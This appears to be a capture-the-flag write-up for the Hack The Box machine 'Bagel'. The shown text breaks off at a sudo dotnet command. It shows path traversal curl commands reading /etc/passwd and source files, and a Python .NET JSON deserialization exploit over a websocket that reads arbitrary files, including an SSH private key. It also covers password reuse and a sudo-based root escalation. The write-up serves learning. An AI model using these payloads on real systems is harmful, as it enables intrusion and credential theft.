## Curl

# Foothold

## LFI

Checking the page I noticed the url http://bagel.htb:8000/?page=index.html which is a classic canditate for a local file inclusion  

### Verification

```bash
curl http://bagel.htb:8000/?page=/../../../../../../etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

### Expose currently running app

```bash
curl http://bagel.htb:8000/?page=/../../../../../../proc/self/cmdline --output -
```

```bash
python3 /home/developer/app/app.py 
```

### Source Code: app.py

```bash
curl http://bagel.htb:8000/?page=/../../../../../../home/developer/app/app.py --output -
```

```python
...
@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")
...
```

### Finding the WebSocket DLL

```bash
# Gather cmdline content 
for i in $(seq 1 2500); do curl http://bagel.htb:8000/?page=../../../../../../proc/$i/cmdline --output - && echo -n "\n"; done >> ./cmdline_enum.log
```

```bash
..
dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
File not found
python3 /home/developer/app/app.py
/usr/sbin/irqbalance --foreground
/usr/sbin/mcelog --daemon --foreground
...
```

## DLL Decompile & Deserialization

I used [ILSpy](https://github.com/icsharpcode/AvaloniaILSpy) to decompile the dll and check the source code  

After digging deep into the code I realized that this could be a possible JSON .NET deserialization attack. That was something that is totally new to me and required a lot of research.  

This article explained a lot and was helpful: [Exploiting JSON serialization in .NET core](https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15)

### Identification

As you can see like mentioned in my linked article the TypeNameHandling is set to "4" instead of "None" which is safe and the default.    

Value "4" can be linked to "Auto" as stated [HERE](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm)

```csharp
public object Deserialize(string json)
{
  try
  {
    JsonSerializerSettings val = new JsonSerializerSettings();
    val.set_TypeNameHandling((TypeNameHandling)4);
    return JsonConvert.DeserializeObject<Base>(json, val);
  }
  catch
  {
    return "{\"Message\":\"unknown\"}";
  }
}

```

To keep the post short I won't go deeper into that, as I myself haven't fully understood the concept yet and just post the exploit code

### Exploit

```python
import sys
import json
import websocket

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": f"../../../../../..{sys.argv[1]}"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result)["RemoveOrder"]["ReadFile"])
```

## SSH-Access: Phil

Using my exploit I was able to get the private key of phil and access the server.  

```bash
python3 des.py /home/phil/.ssh/id_rsa >> id_rsa
chmod 600 id_rsa
ssh -i id_rsa phil@bagel.htb
```

## Password Reuse: Developer

That's an easy one. During enumeration of the application I was able to spot credentials for a database.  
Using that password I was able to become the user Developer.  

```csharp
[Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
public void DB_connection()
{
        //IL_0008: Unknown result type (might be due to invalid IL or missing references)
        //IL_000e: Expected O, but got Unknown
        string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=CENSORED";
        SqlConnection val = new SqlConnection(text);
        string text2 = "INSERT INTO orders (Name,Address,Count,Type) VALUES ('Eliot','Street',4,'Baggel')";
}
```

# Escalation

## Local Enumeration

Since we were able to escalate from phil to developer without any problems it's time to enumerate.  

```bash
sudo -l
Uer developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

## Root

Used the method described here to become root [gtfobins - dotnet](https://gtfobins.github.io/gtfobins/dotnet/) 

```bash
[developer@bagel app]$ sudo /usr/bin/dotnet fsi
